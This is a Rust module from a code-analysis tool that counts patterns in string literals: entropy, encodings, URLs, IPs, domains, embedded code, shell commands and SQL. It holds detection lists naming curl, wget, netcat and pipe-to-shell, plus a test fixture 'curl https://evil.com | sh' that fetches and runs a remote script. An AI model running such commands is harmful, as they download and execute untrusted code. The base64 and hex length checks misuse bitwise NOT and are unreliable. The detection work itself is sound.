//! String-literal metrics ported from cleave.
//!
//! Operates on string-literal text already extracted from the tree.
//! Emits `strings.*` keys describing length distribution, entropy,
//! encoding patterns (base64/hex/URL-encoded/unicode-heavy), content
//! categories (URL/path/IP/email/domain), and suspicious payloads
//! (embedded code, shell commands, SQL).

use crate::output::Metrics;

use super::identifier_metrics::string_entropy;

/// Emit `strings.*` metrics for the collected literals.
pub(super) fn emit(strings: &[&str], metrics: &mut Metrics) {
    if strings.is_empty() {
        return;
    }

    let total = strings.len() as u32;
    metrics.insert("strings.total", f64::from(total));

    let mut total_bytes: u64 = 0;
    let mut max_length: u32 = 0;
    let mut empty_count: u32 = 0;
    let mut entropy_values: Vec<f64> = Vec::with_capacity(strings.len());

    let mut base64_count: u32 = 0;
    let mut hex_count: u32 = 0;
    let mut url_encoded_count: u32 = 0;
    let mut unicode_heavy_count: u32 = 0;

    let mut url_count: u32 = 0;
    let mut path_count: u32 = 0;
    let mut ip_count: u32 = 0;
    let mut email_count: u32 = 0;
    let mut domain_count: u32 = 0;

    let mut very_long_count: u32 = 0;
    let mut embedded_code_count: u32 = 0;
    let mut shell_command_count: u32 = 0;
    let mut sql_count: u32 = 0;
    let mut high_entropy_count: u32 = 0;
    let mut very_high_entropy_count: u32 = 0;

    for s in strings {
        let len = s.len();
        total_bytes += len as u64;
        if len == 0 {
            empty_count += 1;
            continue;
        }
        if len > max_length as usize {
            max_length = len as u32;
        }

        let entropy = string_entropy(s);
        entropy_values.push(entropy);
        if entropy > 5.0 {
            high_entropy_count += 1;
        }
        if entropy > 6.5 {
            very_high_entropy_count += 1;
        }

        if is_likely_base64(s) {
            base64_count += 1;
        }
        if is_hex_string(s) {
            hex_count += 1;
        }
        if has_url_encoding(s) {
            url_encoded_count += 1;
        }
        if has_unicode_heavy(s) {
            unicode_heavy_count += 1;
        }

        if is_url(s) {
            url_count += 1;
        }
        if is_file_path(s) {
            path_count += 1;
        }
        if is_ip_address(s) {
            ip_count += 1;
        }
        if is_email(s) {
            email_count += 1;
        }
        if is_domain(s) {
            domain_count += 1;
        }

        if len > 1000 {
            very_long_count += 1;
        }
        if has_embedded_code(s) {
            embedded_code_count += 1;
        }
        if has_shell_command(s) {
            shell_command_count += 1;
        }
        if has_sql_pattern(s) {
            sql_count += 1;
        }
    }

    if total_bytes > 0 {
        metrics.insert("strings.total_bytes", total_bytes as f64);
        metrics.insert("strings.avg_length", total_bytes as f64 / f64::from(total));
    }
    if max_length > 0 {
        metrics.insert("strings.max_length", f64::from(max_length));
    }
    if empty_count > 0 {
        metrics.insert("strings.empty_count", f64::from(empty_count));
    }

    if !entropy_values.is_empty() {
        let sum: f64 = entropy_values.iter().sum();
        let mean = sum / entropy_values.len() as f64;
        metrics.insert("strings.avg_entropy", mean);
        let variance: f64 = entropy_values
            .iter()
            .map(|&e| {
                let diff = e - mean;
                diff * diff
            })
            .sum::<f64>()
            / entropy_values.len() as f64;
        let stddev = variance.sqrt();
        if stddev > 0.0 {
            metrics.insert("strings.entropy_stddev", stddev);
        }
    }

    if high_entropy_count > 0 {
        metrics.insert("strings.high_entropy_count", f64::from(high_entropy_count));
    }
    if very_high_entropy_count > 0 {
        metrics.insert(
            "strings.very_high_entropy_count",
            f64::from(very_high_entropy_count),
        );
    }
    if base64_count > 0 {
        metrics.insert("strings.base64_candidates", f64::from(base64_count));
    }
    if hex_count > 0 {
        metrics.insert("strings.hex_strings", f64::from(hex_count));
    }
    if url_encoded_count > 0 {
        metrics.insert("strings.url_encoded_strings", f64::from(url_encoded_count));
    }
    if unicode_heavy_count > 0 {
        metrics.insert(
            "strings.unicode_heavy_strings",
            f64::from(unicode_heavy_count),
        );
    }
    if url_count > 0 {
        metrics.insert("strings.url_count", f64::from(url_count));
    }
    if path_count > 0 {
        metrics.insert("strings.path_count", f64::from(path_count));
    }
    if ip_count > 0 {
        metrics.insert("strings.ip_count", f64::from(ip_count));
    }
    if email_count > 0 {
        metrics.insert("strings.email_count", f64::from(email_count));
    }
    if domain_count > 0 {
        metrics.insert("strings.domain_count", f64::from(domain_count));
    }
    if very_long_count > 0 {
        metrics.insert("strings.very_long_strings", f64::from(very_long_count));
    }
    if embedded_code_count > 0 {
        metrics.insert(
            "strings.embedded_code_candidates",
            f64::from(embedded_code_count),
        );
    }
    if shell_command_count > 0 {
        metrics.insert(
            "strings.shell_command_strings",
            f64::from(shell_command_count),
        );
    }
    if sql_count > 0 {
        metrics.insert("strings.sql_strings", f64::from(sql_count));
    }
}

fn is_likely_base64(s: &str) -> bool {
    if s.len() < 16 || !s.len() % 4 == 0 {
        return false;
    }
    let base64_chars = s
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || *c == '+' || *c == '/' || *c == '=')
        .count();
    if base64_chars != s.len() {
        return false;
    }
    let has_upper = s.chars().any(|c| c.is_ascii_uppercase());
    let has_lower = s.chars().any(|c| c.is_ascii_lowercase());
    let valid_padding = !s.contains('=') || s.ends_with('=') || s.ends_with("==");
    has_upper && has_lower && valid_padding
}

fn is_hex_string(s: &str) -> bool {
    if s.len() < 8 || !s.len() % 2 == 0 {
        return false;
    }
    let check = if s.starts_with("0x") || s.starts_with("0X") {
        &s[2..]
    } else {
        s
    };
    check.chars().all(|c| c.is_ascii_hexdigit())
}

fn has_url_encoding(s: &str) -> bool {
    let bytes = s.as_bytes();
    let len = bytes.len();
    let mut count = 0;
    let mut i = 0;
    while i < len {
        if bytes[i] == b'%'
            && i + 2 < len
            && bytes[i + 1].is_ascii_hexdigit()
            && bytes[i + 2].is_ascii_hexdigit()
        {
            count += 1;
            i += 3;
            continue;
        }
        i += 1;
    }
    count > 3
}

fn has_unicode_heavy(s: &str) -> bool {
    let count = s.matches("\\u").count()
        + s.matches("\\x").count()
        + s.matches("&#x").count()
        + s.matches("&#").count();
    count >= 5
}

fn is_url(s: &str) -> bool {
    let lower = s.to_lowercase();
    lower.starts_with("http://")
        || lower.starts_with("https://")
        || lower.starts_with("ftp://")
        || lower.starts_with("file://")
        || lower.starts_with("ws://")
        || lower.starts_with("wss://")
}

fn is_file_path(s: &str) -> bool {
    if s.starts_with('/') && s.len() > 1 && !s.starts_with("//") {
        return s.as_bytes().contains(&b'/');
    }
    if s.len() >= 3 {
        let b = s.as_bytes();
        if b[0].is_ascii_alphabetic() && b[1] == b':' && (b[2] == b'\\' || b[2] == b'/') {
            return true;
        }
    }
    s.starts_with("./")
        || s.starts_with("../")
        || s.starts_with('~')
        || s.contains("/bin/")
        || s.contains("/etc/")
        || s.contains("/tmp/")
        || s.contains("/var/")
        || s.contains("\\Windows\\")
        || s.contains("\\System32\\")
        || s.contains("\\AppData\\")
}

fn is_ip_address(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() == 4 {
        return parts.iter().all(|p| p.parse::<u8>().is_ok());
    }
    if s.contains(':') && !s.contains("://") {
        let colon_count = s.bytes().filter(|&b| b == b':').count();
        if (2..=7).contains(&colon_count) {
            return s.chars().all(|c| c.is_ascii_hexdigit() || c == ':');
        }
    }
    false
}

fn is_email(s: &str) -> bool {
    if !s.contains('@') || s.len() < 5 {
        return false;
    }
    let parts: Vec<&str> = s.split('@').collect();
    if parts.len() != 2 {
        return false;
    }
    let local = parts[0];
    let domain = parts[1];
    !local.is_empty()
        && !domain.is_empty()
        && domain.contains('.')
        && !domain.starts_with('.')
        && !domain.ends_with('.')
}

fn is_domain(s: &str) -> bool {
    if s.contains("://") || s.starts_with('/') || s.contains('\\') {
        return false;
    }
    if s.contains('@') || !s.contains('.') {
        return false;
    }
    let tlds = [
        ".com", ".net", ".org", ".io", ".dev", ".co", ".xyz", ".ru", ".cn", ".de", ".uk", ".info",
        ".biz", ".cc", ".top", ".online", ".site", ".tk", ".ml", ".ga",
    ];
    let lower = s.to_lowercase();
    if tlds.iter().any(|tld| lower.ends_with(tld)) {
        return s
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-');
    }
    false
}

fn has_embedded_code(s: &str) -> bool {
    let patterns = [
        "function(",
        "function ",
        "eval(",
        "exec(",
        "import ",
        "require(",
        "<script",
        "<?php",
        "def ",
        "class ",
        "System.",
        "Runtime.",
        "Process.",
    ];
    let lower = s.to_lowercase();
    patterns.iter().any(|p| lower.contains(&p.to_lowercase()))
}

fn has_shell_command(s: &str) -> bool {
    let patterns = [
        "/bin/sh",
        "/bin/bash",
        "cmd.exe",
        "powershell",
        "curl ",
        "wget ",
        "chmod ",
        "chown ",
        "rm -",
        "dd if=",
        "nc -",
        "netcat",
        "python -c",
        "perl -e",
        "ruby -e",
        "nohup ",
        "| sh",
        "| bash",
        "2>&1",
        ">/dev/null",
        "$(",
        "`",
    ];
    let lower = s.to_lowercase();
    patterns.iter().any(|p| lower.contains(&p.to_lowercase()))
}

fn has_sql_pattern(s: &str) -> bool {
    let patterns = [
        "SELECT ", "INSERT ", "UPDATE ", "DELETE ", "DROP ", "CREATE ", "ALTER ", "UNION ",
        " FROM ", " WHERE ", " AND ", " OR ", "--", "';", "1=1", "1 = 1",
    ];
    let upper = s.to_uppercase();
    patterns.iter().filter(|p| upper.contains(*p)).count() >= 2
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_strings_emit_nothing() {
        let mut m = Metrics::new();
        emit(&[], &mut m);
        assert!(m.is_empty());
    }

    #[test]
    fn basic_counts_and_lengths() {
        let mut m = Metrics::new();
        emit(&["hello", "world", "test"], &mut m);
        assert_eq!(m.get("strings.total"), Some(3.0));
        assert!(m.get("strings.avg_length").unwrap_or(0.0) > 0.0);
    }

    #[test]
    fn base64_candidate_detection() {
        let mut m = Metrics::new();
        emit(&["SGVsbG8gV29ybGQh", "normalString"], &mut m);
        assert_eq!(m.get("strings.base64_candidates"), Some(1.0));
    }

    #[test]
    fn shell_command_detection() {
        let mut m = Metrics::new();
        emit(
            &[
                "/bin/bash -c 'echo test'",
                "curl https://evil.com | sh",
                "normal",
            ],
            &mut m,
        );
        assert_eq!(m.get("strings.shell_command_strings"), Some(2.0));
    }
}
